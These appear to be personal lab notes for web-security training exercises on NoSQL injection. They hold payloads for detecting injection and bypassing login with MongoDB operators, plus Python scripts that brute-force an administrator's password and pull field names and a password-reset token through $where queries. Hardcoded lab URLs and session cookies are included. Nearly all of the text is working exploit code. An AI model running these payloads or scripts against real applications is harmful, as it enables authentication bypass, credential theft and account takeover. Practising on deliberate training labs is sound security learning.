# NoSQL

## Lab: Detecting NoSQL injection

`?category=Gifts%27||1||%27`


## Lab: Exploiting NoSQL operator injection to bypass authentication

```
{"username":{"$regex":".*admin.*"},"password":{"$ne":""}}
```

## Lab: Exploiting NoSQL injection to extract data


Find out password length: `/user/lookup?user=administrator'+%26%26+this.password.length=='8`

Find out password:
```python
import requests

times = 0
cha = 's'

err_msg = "Could not find user"

cookies = {
    "session": "82yFZQZyMarrWnDP6tuCH4zIdBf7ksnr"
}

password = ""
for j in range(8):
    times = j
    for i in range(97, 123):
        cha = chr(i)
        url = "https://0a86004504b1247b8101da65007f0020.web-security-academy.net/user/lookup?user=administrator'+%26%26+this.password[" + str(times) + "]=='" + cha
        response = requests.get(url, cookies=cookies)
        if not err_msg in response.text:
            password += cha
            print(cha, end="")
            break
        else:
            print(".", end="")

print(password)
```


```js
{
    "username":"carlos",
    "password":{
        "$ne": ""
    },
    "$where":"Object.keys(this).length == 5" // how many keys
    "$where":"Object.keys(this)[1].length == 3" // single key's length
    "$where":"Object.keys(this)[1] == username" // single key's name
    "$where":"this.passwordReset.length == 16" // single field value's length
}
```

passwordReset

The following for extract field:

```python
import requests
import json
import string

char_list = list(string.digits + string.ascii_lowercase + string.ascii_uppercase)


err_msg = "Invalid username or password"

url = "https://0a4f006e0378721880b9260700c3005c.web-security-academy.net/login"

cookies = {
    "session": "xwnOrjv6VTKrtX4S1oerJCuJqsVg3RsZ"
}

headers = {
    "Content-Type": "application/json"
}

for i in range(5): # fileds length
    field = ""
    for j in range(13):
        print("the {}th --------".format(j))
        for cha in char_list:

            body = {
                "username":"carlos",
                "password":{
                    "$ne": ""
                },
                "$where":f"Object.keys(this)[{i}].match('^.{{{j}}}{cha}.*')"
            }

            response = requests.post(url, cookies=cookies, headers=headers, data=json.dumps(body))
            if (err_msg in response.text):
                print(".", end="")
            else:
                field += cha
                print(j, cha)
                break
    print(field)
```

The following for extracting passwordReset's value:
```python
value = ""
for i in range(16):
    for cha in char_list:
        body = {
            "username":"carlos",
            "password":{
                "$ne": ""
            },
            "$where":f"this.passwordReset[{i}] == '{cha}'"
        }
        response = requests.post(url, cookies=cookies, headers=headers, data=json.dumps(body))
        if (err_msg in response.text):
            print(".", end="")
        else:
            value+= cha
            print(i, cha)
            break
print(value)
```